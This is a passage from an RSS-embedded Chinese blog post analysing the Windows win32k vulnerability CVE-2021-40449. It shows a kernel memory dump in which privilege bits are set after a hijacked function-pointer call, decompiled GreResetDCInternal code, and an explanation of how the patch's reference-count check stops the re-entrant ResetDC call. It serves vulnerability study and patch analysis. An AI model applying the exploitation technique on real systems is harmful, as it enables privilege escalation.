&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2e9f0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ea00 &lt;span style="color:#ae81ff">20010000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">0000000f&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000001&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ea10 &lt;span style="color:#ae81ff">000001e0&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00001000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ea20 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ee18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ea30 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f1007f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>b2ea40 ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f1007f&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> ffffde8f&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">1f&lt;/span>&lt;span style="color:#ae81ff">10080&lt;/span>c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用DC里面的函数指针之前，自身权限位为正常权限。&lt;/p>
&lt;p>
&lt;img alt="image-20211112202144360" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112202144360.png" />&lt;/p>
&lt;p>调用函数指针之后，可以看到权限位全部置为了1&lt;/p>
&lt;p>
&lt;img alt="image-20211112202350655" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112202350655.png" />&lt;/p>
&lt;h4 id="补丁分析">补丁分析&lt;/h4>
&lt;p>在&lt;strong>漏洞利用分析&lt;/strong>里面分析过漏洞形成原因是因为在调用GreResetDCInternal函数时，使用DC对象指针的时候没有检查DC对象是否异常。而利用该漏洞是通过在调用回调函数时调用ResetDC实现的。&lt;/p>
&lt;p>我们再次回顾一下漏洞函数，在调用hdcOpenDCW也就是在调用回调函数之前会通过DCO的构造函数从DC构造DCO对象，在基本概念中知道，内核对象每被引用一次则对象引用计数器值会加一。调用构造函数时，DC对象引用加一，正常情况下此时DC对象引用次数要为1。如果在回调函数中再次调用ResetDC，则会第二次调用GreResetDCInternal，再次调用DCO的构造函数，DC对象引用再次加一，此时引用次数为2。&lt;/p>
&lt;p>所以判断DC对象异常可以通过判断DC对象的引用次数实现。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> __usercall GreResetDCInternal&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rax&lt;span style="color:#f92672">&amp;gt;&lt;/span>(HDC a1&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rcx&lt;span style="color:#f92672">&amp;gt;&lt;/span>, &lt;span style="color:#66d9ef">__int64&lt;/span> a2&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>rdx&lt;span style="color:#f92672">&amp;gt;&lt;/span>, &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a3&lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>r8&lt;span style="color:#f92672">&amp;gt;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> v24; &lt;span style="color:#75715e">// [rsp+50h] [rbp-20h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v25; &lt;span style="color:#75715e">// [rsp+60h] [rbp-10h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DCOBJ&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">DCOBJ&lt;/span>((DCOBJ &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v25, a1); &lt;span style="color:#75715e">// 利用构造函数从HDC创建DCOBJ对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> v8 &lt;span style="color:#f92672">=&lt;/span> v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">··········&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v8 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span>); &lt;span style="color:#75715e">// 赋值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1736&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> v11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">512&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">120&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> (HDC)&lt;span style="color:#a6e22e">hdcOpenDCW&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>qword_1C0141EB0, v26, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>));&lt;span style="color:#75715e">// 创建新的DC对象，返回对应的HDC句柄
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2584&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DCOBJ&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">DCOBJ&lt;/span>((DCOBJ &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v24, v13);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> (_QWORD &lt;span style="color:#f92672">*&lt;/span>)v24;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v24 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v12 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">120&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v24 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">116&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">308&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2464&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14[&lt;span style="color:#ae81ff">309&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2472&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(_QWORD, _QWORD))(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2768&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v15 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">v15&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)(v14[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1824&lt;/span>i64));&lt;span style="color:#75715e">// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">·······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">HmgSwapLockedHandleContents&lt;/span>(v3, &lt;span style="color:#ae81ff">0&lt;/span>i64, v6, &lt;span style="color:#ae81ff">0&lt;/span>i64, v23);&lt;span style="color:#75715e">// 交换旧的和新的HDC对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">GreReleaseHmgrSemaphore&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">······&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">bDeleteDCInternal&lt;/span>(v6, &lt;span style="color:#ae81ff">1&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64); &lt;span style="color:#75715e">// 删除了hdcOpenDCW分配的HDC，但前面经过HmgSwapLockedHandleContents交换了句柄，实际删除的是旧的HDC
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">······&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在补丁中，增加了对DC对象引用次数进行判断的逻辑，如果在GreResetDCInternal函数中DC对象引用次数大于1则表明已经发生异常，进入异常逻辑抛出错误(因为按正常流程此处DC对象引用次数应为不应该大于1)。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">sub_1C014CB0C&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1, &lt;span style="color:#66d9ef">__int64&lt;/span> a2, &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v30; &lt;span style="color:#75715e">// [rsp+30h] [rbp-1h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)v30;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v30 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_6:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">EngSetLastError&lt;/span>(&lt;span style="color:#ae81ff">6&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_7:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)v30;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>((_WORD &lt;span style="color:#f92672">*&lt;/span>)v30 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>stru_1C032C3F8.Length &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">5u&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span>)&lt;span style="color:#a6e22e">sub_1C00B5068&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>stru_1C032C3F8, &lt;span style="color:#ae81ff">0x400000000000&lt;/span>i64) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v31 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v26;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v29 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v28;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v28 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x1000000&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">SysEntryGetDispatchTableValues&lt;/span>(v10, (&lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>unk_1C02F466B, v11, v12);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>参考链接：&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.secrss.com/articles/35266" target="_blank">https://www.secrss.com/articles/35266&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ" target="_blank">https://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://bbs.pediy.com/thread-269930.htm" target="_blank">https://bbs.pediy.com/thread-269930.htm&lt;/a>&lt;/p>
&lt;/blockquote></description></item></channel></rss>